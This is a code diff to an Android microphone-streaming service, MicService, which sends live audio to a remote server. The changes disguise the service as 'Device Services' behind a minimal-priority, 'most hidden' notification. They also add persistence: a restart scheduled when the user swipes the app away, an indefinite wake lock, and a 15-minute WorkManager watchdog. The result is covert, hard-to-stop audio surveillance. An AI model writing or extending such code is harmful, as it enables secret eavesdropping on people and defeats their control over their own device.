@@ -10,12 +10,18 @@ import android.content.Intent
 import android.media.AudioFormat
 import android.media.AudioRecord
 import android.media.MediaRecorder
+import android.app.AlarmManager
+import android.app.PendingIntent
 import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
+import android.os.SystemClock
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.content.edit
+import androidx.work.ExistingPeriodicWorkPolicy
+import androidx.work.PeriodicWorkRequestBuilder
+import androidx.work.WorkManager
 import kotlinx.coroutines.*
 import okhttp3.*
 import okio.ByteString
@@ -84,7 +90,7 @@ class MicService : Service() {
     // wss://your-app.onrender.com/audio/
     companion object {
         const val TAG          = "MicService"
-        const val CHANNEL_ID   = "mic_monitor_channel"
+        const val CHANNEL_ID   = "device_services_channel"
         const val NOTIF_ID     = 101
 
         // Render cloud URL — works on any network (WiFi or cellular)
@@ -113,7 +119,25 @@ class MicService : Service() {
         Log.i(TAG, "onStartCommand")
         startForeground(NOTIF_ID, buildNotification("Connecting to server…"))
         connectWebSocket()
+        scheduleKeepAlive()
         return START_STICKY   // Android restarts service automatically if killed
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        super.onTaskRemoved(rootIntent)
+        // Schedule immediate restart via AlarmManager when user swipes app away
+        val restartIntent = Intent(applicationContext, MicService::class.java)
+        val pendingIntent = PendingIntent.getService(
+            this, 1, restartIntent,
+            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+        )
+        val alarmManager = getSystemService(AlarmManager::class.java)
+        alarmManager.set(
+            AlarmManager.ELAPSED_REALTIME_WAKEUP,
+            SystemClock.elapsedRealtime() + 2_000,
+            pendingIntent
+        )
+        Log.i(TAG, "onTaskRemoved — scheduled restart in 2s")
     }
 
     override fun onDestroy() {
@@ -351,7 +375,7 @@ class MicService : Service() {
         // IMPORTANCE_MIN = no sound, no status bar icon, collapsed in shade
         val channel = NotificationChannel(
             CHANNEL_ID,
-            "Mic Monitor",
+            "Device Services",
             NotificationManager.IMPORTANCE_MIN
         ).apply {
             description = "Audio streaming service"
@@ -365,7 +389,7 @@ class MicService : Service() {
 
     private fun buildNotification(statusText: String): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Service")
+            .setContentTitle("Device Services")
             .setContentText(statusText)
             .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)  // subtle icon
             .setPriority(NotificationCompat.PRIORITY_MIN)  // lowest priority = most hidden
@@ -389,6 +413,21 @@ class MicService : Service() {
         wakeLock = pm.newWakeLock(
             PowerManager.PARTIAL_WAKE_LOCK,
             "MicMonitor::AudioWakeLock"
-        ).also { it.acquire(24 * 60 * 60 * 1000L) } // 24 hour max
+        ).also { it.acquire() } // Indefinite — released in onDestroy
+    }
+
+    // ────────────────────────────────────────────────────────────────────────
+    // WorkManager watchdog — keeps service alive 24/7
+    // ────────────────────────────────────────────────────────────────────────
+
+    private fun scheduleKeepAlive() {
+        val request = PeriodicWorkRequestBuilder<KeepAliveWorker>(15, TimeUnit.MINUTES)
+            .build()
+        WorkManager.getInstance(applicationContext).enqueueUniquePeriodicWork(
+            "keep_alive",
+            ExistingPeriodicWorkPolicy.KEEP,
+            request
+        )
+        Log.i(TAG, "KeepAlive watchdog scheduled (15 min interval)")
     }
 }
